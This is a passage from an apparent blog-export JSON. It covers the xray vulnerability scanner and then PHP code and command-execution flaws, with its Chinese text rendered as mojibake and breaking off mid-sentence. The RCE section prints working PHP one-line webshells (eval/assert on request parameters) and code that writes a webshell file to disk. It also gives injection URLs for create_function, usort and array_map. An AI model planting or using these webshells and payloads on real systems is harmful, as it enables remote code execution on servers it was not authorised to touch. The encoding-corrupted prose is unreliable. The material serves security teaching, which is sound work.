å°†ä¼šé€æ¸å¼€æ”¾æœåŠ¡æ‰«æçš„ç›¸å…³èƒ½åŠ›ï¼Œç›®å‰ä¸»è¦æ˜¯æœåŠ¡æ‰«æç›¸å…³çš„ pocã€‚è€ç‰ˆæœ¬å‡çº§çš„ç”¨æˆ·è¯·æ³¨æ„é…ç½®æ–‡ä»¶éœ€è¦åŠ å…¥æœåŠ¡æ‰«æçš„ç›¸å…³ poc åå­—ï¼Œç›®å‰åªæœ‰ä¸€ä¸ª tomcat-cve-2020-1938 ajp åè®®ä»»æ„æ–‡ä»¶æ£€æµ‹ pocã€‚ &emsp;&emsp;å‚æ•°é…ç½®ç›®å‰æ¯”è¾ƒç®€å•ï¼Œè¾“å…¥æ”¯æŒä¸¤ç§æ–¹å¼ï¼Œä¾‹å¦‚ï¼š å¿«é€Ÿæ£€æµ‹å•ä¸ªç›®æ ‡./xray servicescan --target 127.0.0.1:8009æ‰¹é‡æ£€æŸ¥çš„ 1.file ä¸­çš„ç›®æ ‡, ä¸€è¡Œä¸€ä¸ªç›®æ ‡ï¼Œå¸¦ç«¯å£./xray servicescan --target-file 1.file &emsp;&emsp;å…¶ä¸­ 1.file çš„æ ¼å¼ä¸ºä¸€ä¸ªè¡Œä¸€ä¸ª serviceï¼Œå¦‚ 10.3.0.203:8009127.0.0.1:8009 &emsp;&emsp;ä¹Ÿå¯ä»¥å°†ç»“æœè¾“å‡ºåˆ°æŠ¥å‘Šæˆ–jsonæ–‡ä»¶ä¸­ å°†æ£€æµ‹ç»“æœè¾“å‡ºåˆ° html æŠ¥å‘Šä¸­./xray servicescan --target 127.0.0.1:8009 --html-output service.html./xray servicescan --target-file 1.file --html-output service.htmlå°†æ£€æµ‹ç»“æœè¾“å‡ºåˆ° json æ–‡ä»¶ä¸­./xray servicescan --target 127.0.0.1:8099 --json-output 1.json NAME: servicescan - Run a service scan taskUSAGE: servicescan [command options] [arguments...]OPTIONS: --target value specify the target, for example: host:8009 --target-file value load targets from a local file, one target a line --json-output FILE output xray results to FILE in json format --html-output FILE output xray result to `FILE` in HTML format &emsp;&emsp;ä»¥ tomcat CVE-2020-1938 ajp åè®®ä»»æ„æ–‡ä»¶è¯»å–ä¸ºä¾‹ï¼Œå‘½ä»¤è¡Œå¦‚ä¸‹å›¾ã€‚ ä¸ƒã€é«˜çº§ç”¨æ³•1ã€å¯ç”¨éƒ¨åˆ†æ‰«ææ’ä»¶&emsp;&emsp;ä½¿ç”¨ --plugins å‚æ•°å¯ä»¥é€‰æ‹©ä»…å¯ç”¨éƒ¨åˆ†æ‰«ææ’ä»¶ï¼Œå¤šä¸ªæ’ä»¶ä¹‹é—´å¯ä½¿ç”¨é€—å·åˆ†éš”ï¼Œå¦‚ï¼š ./xray webscan --plugins cmd_injection --url http://example.com/ &emsp;&emsp;ç›®å‰æä¾›çš„æ’ä»¶åˆ—è¡¨å¦‚ä¸‹ï¼š [+] SQL æ³¨å…¥æ£€æµ‹ (key: sqldet)ï¼šæ”¯æŒæŠ¥é”™æ³¨å…¥ã€å¸ƒå°”æ³¨å…¥å’Œæ—¶é—´ç›²æ³¨ç­‰XSS æ£€æµ‹ï¼ˆkey: xssï¼‰[+] æ”¯æŒæ‰«æåå°„å‹ã€å­˜å‚¨å‹ XSSå‘½ä»¤/ä»£ç æ³¨å…¥æ£€æµ‹ (key: cmd_injection)[+] æ”¯æŒ shell å‘½ä»¤æ³¨å…¥ã€PHP ä»£ç æ‰§è¡Œã€æ¨¡æ¿æ³¨å…¥ç­‰ç›®å½•æšä¸¾ (key: dirscan)[+] æ£€æµ‹å¤‡ä»½æ–‡ä»¶ã€ä¸´æ—¶æ–‡ä»¶ã€debug é¡µé¢ã€é…ç½®æ–‡ä»¶ç­‰10ä½™ç±»æ•æ„Ÿè·¯å¾„å’Œæ–‡ä»¶è·¯å¾„ç©¿è¶Šæ£€æµ‹ (key: path_traversal)[+] æ”¯æŒå¸¸è§å¹³å°å’Œç¼–ç XML å®ä½“æ³¨å…¥æ£€æµ‹ (key: xxe)[+] æ”¯æŒæœ‰å›æ˜¾å’Œåè¿å¹³å°æ£€æµ‹POC ç®¡ç† (key: phantasm)[+] é»˜è®¤å†…ç½®éƒ¨åˆ†å¸¸ç”¨çš„ POCï¼Œç”¨æˆ·å¯ä»¥æ ¹æ®éœ€è¦è‡ªè¡Œæ„å»º POC å¹¶è¿è¡Œã€‚å¯å‚è€ƒï¼šPOC ç¼–å†™æ–‡æ¡£æ–‡ä»¶ä¸Šä¼ æ£€æµ‹ (key: upload)[+] æ”¯æŒæ£€æµ‹å¸¸è§çš„åç«¯æœåŠ¡å™¨è¯­è¨€çš„ä¸Šä¼ æ¼æ´å¼±å£ä»¤æ£€æµ‹ (key: brute_force)[+] æ”¯æŒæ£€æµ‹ HTTP åŸºç¡€è®¤è¯å’Œç®€æ˜“è¡¨å•å¼±å£ä»¤ï¼Œå†…ç½®å¸¸è§ç”¨æˆ·åå’Œå¯†ç å­—å…¸JSONP æ£€æµ‹ (key: jsonp)[+] æ£€æµ‹åŒ…å«æ•æ„Ÿä¿¡æ¯å¯ä»¥è¢«è·¨åŸŸè¯»å–çš„ jsonp æ¥å£SSRF æ£€æµ‹ (key: ssrf)[+] ssrf æ£€æµ‹æ¨¡å—ï¼Œæ”¯æŒå¸¸è§çš„ç»•è¿‡æŠ€æœ¯å’Œåè¿å¹³å°æ£€æµ‹åŸºçº¿æ£€æŸ¥ (key: baseline)[+] æ£€æµ‹ä½ SSL ç‰ˆæœ¬ã€ç¼ºå¤±çš„æˆ–é”™è¯¯æ·»åŠ çš„ http å¤´ç­‰ä»»æ„è·³è½¬æ£€æµ‹ (key: redirect)[+] æ”¯æŒ HTML meta è·³è½¬ã€30x è·³è½¬ç­‰CRLF æ³¨å…¥ (key: crlf_injection)[+] æ£€æµ‹ HTTP å¤´æ³¨å…¥ï¼Œæ”¯æŒ queryã€body ç­‰ä½ç½®çš„å‚æ•° 2ã€åªæ‰«æä¸€ä¸ªURL&emsp;&emsp;xray è¿˜æä¾›äº†æ–¹ä¾¿çš„åªæ‰«æä¸€ä¸ª URL çš„æ–¹å¼ï¼Œå¦‚ï¼š ./xray webscan --url http://example.com/ --json-output out.json 3ã€é…ç½®æ–‡ä»¶&emsp;&emsp;xray è¿˜æä¾›äº†å‹å¥½é…ç½®æ–‡ä»¶ï¼Œå¯ä»¥æ–¹ä¾¿åœ°å°†å¸¸ç”¨çš„å‘½ä»¤è¡Œå‚æ•°å†™åˆ°é…ç½®æ–‡ä»¶ä¸­ï¼Œé¿å…äº†æ¯æ¬¡éƒ½è¦è¾“å…¥ä¸€å¤§ä¸²å‚æ•°çš„ç—›è‹¦ã€‚ &emsp;&emsp;xray é»˜è®¤ä¼šè¯»å–è¿è¡Œç›®å½•ä¸‹çš„ config.yaml æ–‡ä»¶ä½œä¸ºé…ç½®æ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ --config å‚æ•°æŒ‡å®šå…¶ä»–é…ç½®æ–‡ä»¶ã€‚ &emsp;&emsp;å…³äºå‘½ä»¤è¡Œçš„è¯¦ç»†é…ç½®å¯ä»¥å‚è€ƒ xray å®˜æ–¹æ–‡æ¡£ã€‚ 4ã€åè¿å¹³å°&emsp;&emsp;xray åœ¨è¿è¡Œæ—¶ä¼šè‡ªåŠ¨å¯åŠ¨åè¿å¹³å°æ¥è¾…åŠ©ç›²æ‰“æ‰«æï¼Œå¯ä»¥åœ¨é…ç½®æ–‡ä»¶ä¸­ä¿®æ”¹åè¿å¹³å°çš„é…ç½®ã€‚ç›®å‰æ”¯æŒ http å’Œ dns ä¸¤ç§åè¿æœºåˆ¶ï¼Œå½“æœåŠ¡ç«¯è§¦å‘ payload æ—¶ xray ä¼šæ ¹æ®åè¿å¹³å°çš„çŠ¶æ€åˆ¤æ–­æ¼æ´æ˜¯å¦å­˜åœ¨ã€‚ dns åè¿éœ€è¦å¯ç”¨ root æƒé™ç›‘å¬ 53 ç«¯å£ï¼Œå¹¶ä¸”å°†åŸŸåçš„ ns è®°å½•æŒ‡å‘åè¿å¹³å°çš„ç›‘å¬åœ°å€ 5ã€è‡ªå®šä¹‰POC&emsp;&emsp;xray æ”¯æŒç”¨æˆ·ä½¿ç”¨ YAML ç¼–å†™ POCã€‚YAML æ˜¯JSON çš„è¶…é›†ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬ç”šè‡³å¯ä»¥ç”¨ JSON ç¼–å†™ POCï¼Œä½†è¿™é‡Œè¿˜æ˜¯å»ºè®®å¤§å®¶ä½¿ç”¨ YAML æ¥ç¼–å†™ï¼ŒåŸå› å¦‚ä¸‹ï¼š [+] YAML æ ¼å¼çš„ â€œå€¼â€ æ— éœ€ä½¿ç”¨åŒå¼•å·åŒ…è£¹ï¼Œç‰¹æ®Šå­—ç¬¦æ— éœ€è½¬ä¹‰[+] YAML æ ¼å¼ä½¿å†…å®¹æ›´åŠ å¯è¯»[+] YAML ä¸­å¯ä»¥ä½¿ç”¨æ³¨é‡Š &emsp;&emsp;æˆ‘ä»¬å¯ä»¥ç¼–å†™ä»¥ä¸‹çš„ yaml æ¥æµ‹è¯• tomcat put ä¸Šä¼ ä»»æ„æ–‡ä»¶æ¼æ´ï¼š name: poc-yaml-tomcat_putrules: - method: PUT path: /hello.jsp body: world - method: GET path: /hello.jsp search: world &emsp;&emsp;è¿™é‡Œè¿˜è¦æ„Ÿè°¢ phith0n è´¡çŒ®çš„ xray PoC ç”Ÿæˆå™¨ï¼Œè™½ç„¶ä¸‘é™‹ï¼Œä½†ä¸å¤±æ–‡é›…ã€‚ &emsp;&emsp;å°† POC ä¿å­˜åˆ° YAML æ–‡ä»¶åä½¿ç”¨ --poc å‚æ•°å¯ä»¥æ–¹ä¾¿åœ°è°ƒç”¨ï¼Œå¦‚ï¼š ./xray webscan --plugins phantasm --poc /home/test/poc.yaml --url http://example.com/ å…«ã€ä½¿ç”¨åœºæ™¯1ã€ä¸BurpSuiteè”åŠ¨&emsp;&emsp;åœ¨å®é™…æµ‹è¯•è¿‡ç¨‹ä¸­ï¼Œé™¤äº†è¢«åŠ¨æ‰«æï¼Œä¹Ÿæ—¶å¸¸éœ€è¦æ‰‹å·¥æµ‹è¯•ã€‚è¿™é‡Œä½¿ç”¨ Burp çš„åŸç”ŸåŠŸèƒ½ä¸ xray å»ºç«‹èµ·ä¸€ä¸ªå¤šå±‚ä»£ç†ï¼Œè®©æµé‡ä» Burp è½¬å‘åˆ° xray ä¸­ã€‚ &emsp;&emsp;é¦–å…ˆ xray å»ºç«‹èµ· webscan çš„ç›‘å¬ &emsp;&emsp;è¿›å…¥ Burp åï¼Œæ‰“å¼€ User options æ ‡ç­¾é¡µï¼Œç„¶åæ‰¾åˆ° Upstream Proxy Servers è®¾ç½®ã€‚ &emsp;&emsp;ç‚¹å‡» Add æ·»åŠ ä¸Šæ¸¸ä»£ç†ä»¥åŠä½œç”¨åŸŸï¼ŒDestination hostå¤„å¯ä»¥ä½¿ç”¨ * åŒ¹é…å¤šä¸ªä»»æ„å­—ç¬¦ä¸²ï¼Œ? åŒ¹é…å•ä¸€ä»»æ„å­—ç¬¦ä¸²ï¼Œè€Œä¸Šæ¸¸ä»£ç†çš„åœ°å€åˆ™å¡«å†™ xray çš„ç›‘å¬åœ°å€ã€‚ &emsp;&emsp;æ¥ä¸‹æ¥ï¼Œåœ¨æµè§ˆå™¨ç«¯ä½¿ç”¨ Burp çš„ä»£ç†åœ°å€ &emsp;&emsp;æ­¤æ—¶ï¼Œè¯·æ±‚å·²ç»é€šè¿‡äº† Burp","categories":[{"name":"å®‰å…¨å·¥å…·/å®‰å…¨å¼€å‘","slug":"å®‰å…¨å·¥å…·-å®‰å…¨å¼€å‘","permalink":"https://wolke.cn/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7-%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"Xray","slug":"Xray","permalink":"https://wolke.cn/tags/Xray/"},{"name":"æ¼æ´æ‰«æ","slug":"æ¼æ´æ‰«æ","permalink":"https://wolke.cn/tags/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/"}],"author":"w01ke"},{"title":"RCEä»£ç åŠå‘½ä»¤æ‰§è¡Œæ¼æ´","slug":"RCEä»£ç åŠå‘½ä»¤æ‰§è¡Œæ¼æ´","date":"2022-02-13T09:26:53.000Z","updated":"2022-02-15T16:39:55.997Z","comments":true,"path":"post/aa4ddb75.html","link":"","permalink":"https://wolke.cn/post/aa4ddb75.html","excerpt":"","text":"&emsp;&emsp;åœ¨ Web åº”ç”¨ä¸­æœ‰æ—¶å€™ç¨‹åºå‘˜ä¸ºäº†è€ƒè™‘çµæ´»æ€§ã€ç®€æ´æ€§ï¼Œä¼šåœ¨ä»£ç è°ƒç”¨ ä»£ç æˆ–å‘½ä»¤æ‰§è¡Œå‡½æ•°å»å¤„ç†ã€‚æ¯”å¦‚å½“åº”ç”¨åœ¨è°ƒç”¨ä¸€äº›èƒ½å°†å­—ç¬¦ä¸²è½¬åŒ–æˆä»£ç çš„å‡½æ•°æ—¶ï¼Œæ²¡æœ‰è€ƒè™‘ç”¨æˆ·æ˜¯å¦èƒ½æ§åˆ¶è¿™ä¸ªå­—ç¬¦ä¸²ï¼Œå°†é€ æˆä»£ç æ‰§è¡Œæ¼æ´ã€‚åŒæ ·è°ƒç”¨ç³»ç»Ÿå‘½ä»¤å¤„ç†ï¼Œå°†é€ æˆå‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚ ä¸€ã€ä»£ç æ‰§è¡Œ1ã€è„šæœ¬ï¼ˆ1ï¼‰PHP&emsp;&emsp;PHPä¸­å¯ä»¥æ‰§è¡Œä»£ç çš„å‡½æ•°ï¼Œå¸¸ç”¨äºç¼–å†™ä¸€å¥è¯æœ¨é©¬ï¼Œå¯èƒ½å¯¼è‡´ä»£ç æ‰§è¡Œæ¼æ´ï¼Œè¿™é‡Œå¯¹ä»£ç æ‰§è¡Œå‡½æ•°åšä¸€äº›å½’çº³ã€‚ &emsp;&emsp;å¸¸è§ä»£ç æ‰§è¡Œå‡½æ•°ï¼Œå¦‚ eval()ã€assert()ã€preg_replace()ã€create_function()array_map()ã€call_user_func()ã€call_user_func_array()ï¼Œarray_filterï¼Œusortï¼Œuasort()æ–‡ä»¶æ“ä½œå‡½æ•°ã€åŠ¨æ€å‡½æ•°ï¼ˆ$a($b)ï¼‰ aã€eval()&emsp;&emsp;eval()å‡½æ•°æŠŠå­—ç¬¦ä¸²æŒ‰ç…§ PHP ä»£ç æ¥è®¡ç®—ï¼Œå¦‚å¸¸è§çš„ä¸€å¥è¯åé—¨ç¨‹åºï¼š &lt;?php eval($_POST[cmd]);?&gt; bã€assert()&emsp;&emsp;ä¸evalç±»ä¼¼ï¼Œå­—ç¬¦ä¸²è¢« assert() å½“åš PHP ä»£ç æ¥æ‰§è¡Œï¼Œå¦‚ï¼š &lt;?php //?cmd=phpinfo()assert($_REQUEST[cmd]); ?&gt; cã€preg_replace&emsp;&emsp;è¯­æ³•ï¼šmixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] ) &emsp;&emsp;æœç´¢ subject ä¸­åŒ¹é… pattern çš„éƒ¨åˆ†ï¼Œ ä»¥ replacement è¿›è¡Œæ›¿æ¢ã€‚ &emsp;&emsp;å‚æ•°è¯´æ˜ï¼š [+] $pattern: è¦æœç´¢çš„æ¨¡å¼ï¼Œå¯ä»¥æ˜¯å­—ç¬¦ä¸²æˆ–ä¸€ä¸ªå­—ç¬¦ä¸²æ•°ç»„ã€‚[+] $replacement: ç”¨äºæ›¿æ¢çš„å­—ç¬¦ä¸²æˆ–å­—ç¬¦ä¸²æ•°ç»„ã€‚[+] $subject: è¦æœç´¢æ›¿æ¢çš„ç›®æ ‡å­—ç¬¦ä¸²æˆ–å­—ç¬¦ä¸²æ•°ç»„ã€‚[+] $limit: å¯é€‰ï¼Œå¯¹äºæ¯ä¸ªæ¨¡å¼ç”¨äºæ¯ä¸ª subject å­—ç¬¦ä¸²çš„æœ€å¤§å¯æ›¿æ¢æ¬¡æ•°ã€‚ é»˜è®¤æ˜¯-1ï¼ˆæ— é™åˆ¶ï¼‰ã€‚[+] $count: å¯é€‰ï¼Œä¸ºæ›¿æ¢æ‰§è¡Œçš„æ¬¡æ•°ã€‚ &emsp;&emsp;è¿”å›å€¼ï¼šå¦‚æœ subject æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œ preg_replace() è¿”å›ä¸€ä¸ªæ•°ç»„ï¼Œ å…¶ä»–æƒ…å†µä¸‹è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚ å¦‚æœåŒ¹é…è¢«æŸ¥æ‰¾åˆ°ï¼Œæ›¿æ¢åçš„ subject è¢«è¿”å›ï¼Œå…¶ä»–æƒ…å†µä¸‹è¿”å›æ²¡æœ‰æ”¹å˜çš„ subjectã€‚å¦‚æœå‘ç”Ÿé”™è¯¯ï¼Œè¿”å› NULLã€‚ &emsp;&emsp;å±é™©ç‚¹ï¼špreg_replace()å‡½æ•°åŸæœ¬æ˜¯æ‰§è¡Œä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„æœç´¢å’Œæ›¿æ¢ï¼Œä½†å› ä¸ºå­˜åœ¨å±é™©çš„/eä¿®é¥°ç¬¦ï¼Œä½¿ preg_replace() å°† replacement å‚æ•°å½“ä½œ PHP ä»£ç  &emsp;&emsp;ç¤ºä¾‹ä»£ç ï¼š &lt;?php //?cmd=phpinfo()@preg_replace(&quot;/abc/e&quot;,$_REQUEST[&#x27;cmd&#x27;],&quot;abcd&quot;);?&gt; dã€create_function()&emsp;&emsp;è¯­æ³•ï¼šstring create_function(string $args, string $code) string $args å˜é‡éƒ¨åˆ†string $code æ–¹æ³•ä»£ç éƒ¨åˆ† &emsp;&emsp;ä¸¾ä¾‹ï¼š create_function(&#x27;$fname&#x27;,&#x27;echo $fname.&quot;Zhang&quot;&#x27;) &emsp;&emsp;ç±»ä¼¼äºï¼š function fT($fname) &#123; echo $fname.&quot;Zhang&quot;;&#125; &emsp;&emsp;ä¸¾ä¸€ä¸ªå®˜æ–¹æä¾›çš„ä¾‹å­ï¼š &lt;?php$newfunc = create_function(&#x27;$a,$b&#x27;, &#x27;return &quot;ln($a) + ln($b) = &quot; . log($a * $b);&#x27;);echo &quot;New anonymous function: $newfunc&quot;;echo $newfunc(2, M_E) . &quot;&quot;;// outputs// New anonymous function: lambda_1// ln(2) + ln(2.718281828459) = 1.6931471805599?&gt; &emsp;&emsp;create_functionä¸»è¦ç”¨æ¥åˆ›å»ºåŒ¿åå‡½æ•°ï¼Œå¦‚æœæ²¡æœ‰ä¸¥æ ¼å¯¹å‚æ•°ä¼ é€’è¿›è¡Œè¿‡æ»¤ï¼Œæ”»å‡»è€…å¯ä»¥æ„é€ ç‰¹æ®Šå­—ç¬¦ä¸²ä¼ é€’ç»™create_function()æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚ &emsp;&emsp;ç°åœ¨åˆ©ç”¨create_function()å®ç°ä»£ç æ³¨å…¥ &emsp;&emsp;æµ‹è¯•ç¯å¢ƒç‰ˆæœ¬ï¼šapache +php 5.2ã€apache +php 5.3 &emsp;&emsp;æœ‰é—®é¢˜çš„ä»£ç  &lt;?php//index.php?id=2;&#125;phpinfo();/*$id=$_GET[&#x27;id&#x27;];$str2=&#x27;echo &#x27;.$a.&#x27;test&#x27;.$id.&quot;;&quot;;echo $str2;echo &quot;&lt;br/&gt;&quot;;echo &quot;==============================&quot;;echo &quot;&lt;br/&gt;&quot;;$f1 = create_function(&#x27;$a&#x27;,$str2);echo &quot;&lt;br/&gt;&quot;;echo &quot;==============================&quot;;?&gt; &emsp;&emsp;åˆ©ç”¨æ–¹æ³•ï¼šindex.php?id=2;&#125;phpinfo();/* &emsp;&emsp;å®ç°åŸç†ï¼š ç”±äºid= 2;&#125;phpinfo();/*æ‰§è¡Œå‡½æ•°ä¸ºï¼šæºä»£ç ï¼šfunction fT($a) &#123; echo &quot;test&quot;.$a;&#125;æ³¨å…¥åä»£ç ï¼šfunction fT($a) &#123; echo &quot;test&quot;;&#125; phpinfo();/*;//æ­¤å¤„ä¸ºæ³¨å…¥ä»£ç ã€‚&#125; eã€array_map&emsp;&emsp;array_map()å‡½æ•°å°†ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ä½œç”¨åˆ°æ•°ç»„ä¸­çš„æ¯ä¸ªå€¼ä¸Šï¼Œå¹¶è¿”å›ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ä½œç”¨åçš„å¸¦æœ‰æ–°å€¼çš„æ•°ç»„ã€‚ å›è°ƒå‡½æ•°æ¥å—çš„å‚æ•°æ•°ç›®åº”è¯¥å’Œä¼ é€’ç»™array_map()å‡½æ•°çš„æ•°ç»„æ•°ç›®ä¸€è‡´ã€‚ &emsp;&emsp;ä»£ç ç¤ºä¾‹ï¼š &lt;?php//?func=system&amp;cmd=whoami$func=$_GET[&#x27;func&#x27;];$cmd=$_GET[&#x27;cmd&#x27;];$array[0]=$cmd;$new_array=array_map($func,$array);//print_r($new_array);?&gt; fã€call_user_func()/call_user_func_array ()&emsp;&emsp;call_user_funcâ€”â€”æŠŠç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°è°ƒç”¨ï¼Œå…¶ä½™å‚æ•°æ˜¯å›è°ƒå‡½æ•°çš„å‚æ•°ã€‚ &emsp;&emsp;call_user_func_arrayâ€”â€”è°ƒç”¨å›è°ƒå‡½æ•°ï¼Œå¹¶æŠŠä¸€ä¸ªæ•°ç»„å‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°çš„å‚æ•° &lt;?php //?cmd=phpinfo()@call_user_func(assert,$_GET[&#x27;cmd&#x27;]);?&gt;&lt;?php //?cmd=phpinfo()$cmd=$_GET[&#x27;cmd&#x27;];$array[0]=$cmd;call_user_func_array(&quot;assert&quot;,$array);?&gt; gã€array_filter()array array_filter(array $array [, callable $callback [, int $flag = 0 ]] ) &emsp;&emsp;ä¾æ¬¡å°† array æ•°ç»„ä¸­çš„æ¯ä¸ªå€¼ä¼ é€’åˆ° callback å‡½æ•°ã€‚å¦‚æœ callback å‡½æ•°è¿”å› trueï¼Œåˆ™ array æ•°ç»„çš„å½“å‰å€¼ä¼šè¢«åŒ…å«åœ¨è¿”å›çš„ç»“æœæ•°ç»„ä¸­ã€‚æ•°ç»„çš„é”®åä¿ç•™ä¸å˜ã€‚ &lt;?php //?func=system&amp;cmd=whoami$cmd=$_GET[&#x27;cmd&#x27;];$array1=array($cmd);$func =$_GET[&#x27;func&#x27;];array_filter($array1,$func);?&gt; hã€usort()ã€uasort()&emsp;&emsp;usort()é€šè¿‡ç”¨æˆ·è‡ªå®šä¹‰çš„æ¯”è¾ƒå‡½æ•°å¯¹æ•°ç»„è¿›è¡Œæ’åºã€‚ &emsp;&emsp;uasort()ä½¿ç”¨ç”¨æˆ·è‡ªå®šä¹‰çš„æ¯”è¾ƒå‡½æ•°å¯¹æ•°ç»„ä¸­çš„å€¼è¿›è¡Œæ’åºå¹¶ä¿æŒç´¢å¼•å…³è” ã€‚ &emsp;&emsp;ä»£ç ç¤ºä¾‹ï¼š phpç¯å¢ƒ&gt;=5.6æ‰èƒ½ç”¨&lt;?php usort(...$_GET);?&gt;åˆ©ç”¨æ–¹å¼ï¼štest.php?1[]=1-1&amp;1[]=eval($_POST[&#x27;x&#x27;])&amp;2=assert[POST]:x=phpinfo();phpç¯å¢ƒ&gt;=&lt;5.6æ‰èƒ½ç”¨&lt;?php usort($_GET,&#x27;asse&#x27;.&#x27;rt&#x27;);?&gt;åˆ©ç”¨æ–¹å¼ï¼štest.php?1=1+1&amp;2=eval($_POST[x])[POST]:x=phpinfo(); å‚è€ƒé“¾æ¥ï¼šhttps://www.leavesongs.com/PHP/bypass-eval-length-restrict.html iã€æ–‡ä»¶æ“ä½œå‡½æ•°&emsp;&emsp;file_put_contents() å‡½æ•°æŠŠä¸€ä¸ªå­—ç¬¦ä¸²å†™å…¥æ–‡ä»¶ä¸­ã€‚ &emsp;&emsp;fputs() å‡½æ•°å†™å…¥æ–‡ä»¶ &emsp;&emsp;ä»£ç ç¤ºä¾‹ï¼š &lt;?php $test=&#x27;&lt;?php eval($_POST[cmd]);?&gt;&#x27;;file_put_contents(&#x27;test1.php&#x27;,$test);?&gt;&lt;?php fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php eval($_POST[cmd])?&gt;&#x27;); ?&gt; jã€åŠ¨æ€å‡½æ•°&emsp;&emsp;PHPå‡½æ•°ç›´æ¥ç”±å­—ç¬¦ä¸²æ‹¼æ¥ &emsp;&emsp;ä»£ç ç¤ºä¾‹ï¼š &lt;?php //?a=assert&amp;b=phpinfo()$_GET[&#x27;a&#x27;]($_GET[&#x27;b&#x27;]);?&gt; ï¼ˆ2ï¼‰Javaå¾…æ›´æ–°â€¦.. ï¼ˆ3ï¼‰Pythonå¾…æ›´æ–°â€¦.. 2ã€äº§ç”Ÿï¼ˆ1ï¼‰Webæºç  thinkphp eyoucms wordpress ï¼ˆ2ï¼‰ä¸­é—´ä»¶å¹³å° Tomcat apache struts2 Redis Nginxï¼šPHP è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´å¤ç°ï¼ˆCVE-2019-11043ï¼‰ ï¼ˆ3ï¼‰å…¶ä»–ç¯å¢ƒ php-cgi jenkins-cl java RMI 3ã€ç›‘æµ‹ï¼ˆ1ï¼‰ç™½ç›’ ä»£ç å®¡è®¡ ï¼ˆ2ï¼‰é»‘ç›’ æ¼æ‰«å·¥å…· å…¬å¼€æ¼æ´ æ‰‹å·¥çœ‹å‚æ•°åŠåŠŸèƒ½ç‚¹ 4ã€é˜²å¾¡ æ•æ„Ÿå‡½æ•°ç¦ç”¨ å˜é‡è¿‡æ»¤æˆ–å›ºå®š wafäº§å“ äºŒã€å‘½ä»¤æ‰§è¡Œ1ã€å‘½ä»¤æ‰§è¡Œæ¼æ´åŸç†&emsp;&emsp;åº”ç”¨ç¨‹åºæœ‰æ—¶éœ€è¦è°ƒç”¨ä¸€äº›æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°ï¼Œå¦‚åœ¨PHPä¸­ï¼Œä½¿ç”¨systemã€execã€shell_execã€passthruã€ pcntl_execã€popenã€proc_popenã€ åå¼•å·ç­‰å‡½æ•°å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚å½“é»‘å®¢èƒ½æ§åˆ¶è¿™äº›å‡½æ•°ä¸­çš„å‚æ•°æ—¶ï¼Œå°±å¯ä»¥å°†æ¶æ„çš„ç³»ç»Ÿå‘½ä»¤æ‹¼æ¥åˆ°æ­£å¸¸å‘½ä»¤ä¸­ï¼Œä»è€Œé€ æˆå‘½ä»¤æ‰§è¡Œæ”»å‡»ï¼Œè¿™å°±æ˜¯å‘½ä»¤æ‰§è¡Œæ¼æ´ ï¼ˆ1ï¼‰system()system â€” æ‰§è¡Œå¤–éƒ¨ç¨‹åºï¼Œå¹¶ä¸”æ˜¾ç¤ºè¾“å‡º (PHP 4, PHP 5, PHP 7, PHP 8) è¯­æ³•ï¼šsystem(string $command, int &amp;$return_var = ?): string å‚æ•°ï¼š commandä¸ºè¦æ‰§è¡Œçš„å‘½ä»¤ã€‚ return_varå¦‚æœæä¾› return_var å‚æ•°ï¼Œ åˆ™å¤–éƒ¨å‘½ä»¤æ‰§è¡Œåçš„è¿”å›çŠ¶æ€å°†ä¼šè¢«è®¾ç½®åˆ°æ­¤å˜é‡ä¸­ã€‚ è¿”å›å€¼ï¼š æˆåŠŸåˆ™è¿”å›å‘½ä»¤è¾“å‡ºçš„æœ€åä¸€è¡Œï¼Œ å¤±è´¥åˆ™è¿”å› false åŒ C ç‰ˆæœ¬çš„ system() å‡½æ•°ä¸€æ ·ï¼Œ æœ¬å‡½æ•°æ‰§è¡Œ command å‚æ•°æ‰€æŒ‡å®šçš„å‘½ä»¤ï¼Œ å¹¶ä¸”è¾“å‡ºæ‰§è¡Œç»“æœã€‚ å¦‚æœ PHP è¿è¡Œåœ¨æœåŠ¡å™¨æ¨¡å—ä¸­ï¼Œ system() å‡½æ•°è¿˜ä¼šå°è¯•åœ¨æ¯è¡Œè¾“å‡ºå®Œæ¯•ä¹‹åï¼Œ è‡ªåŠ¨åˆ·æ–° web æœåŠ¡å™¨çš„è¾“å‡ºç¼“å­˜ã€‚ å¦‚æœè¦è·å–ä¸€ä¸ªå‘½ä»¤æœªç»ä»»ä½•å¤„ç†çš„åŸå§‹è¾“å‡ºï¼Œ è¯·ä½¿ç”¨ passthru() å‡½æ•°ã€‚ &lt;?phpecho &#x27;&lt;pre&gt;&#x27;;// è¾“å‡º shell å‘½ä»¤ &quot;ls&quot; çš„è¿”å›ç»“æœ// å¹¶ä¸”å°†è¾“å‡ºçš„æœ€åä¸€æ ·å†…å®¹è¿”å›åˆ° $last_lineã€‚// å°†å‘½ä»¤çš„è¿”å›å€¼ä¿å­˜åˆ° $retvalã€‚$last_line = system(&#x27;ls&#x27;, $retval);// æ‰“å°æ›´å¤šä¿¡æ¯echo &#x27;&lt;/pre&gt;&lt;hr /&gt;Last line of the output: &#x27; . $last_line . &#x27;&lt;hr /&gt;Return value: &#x27; . $retval;?&gt; ï¼ˆ2ï¼‰exec()exec â€” æ‰§è¡Œä¸€ä¸ªå¤–éƒ¨ç¨‹åº (PHP 4, PHP 5, PHP 7, PHP 8) è¯­æ³•ï¼šexec(string $command, array 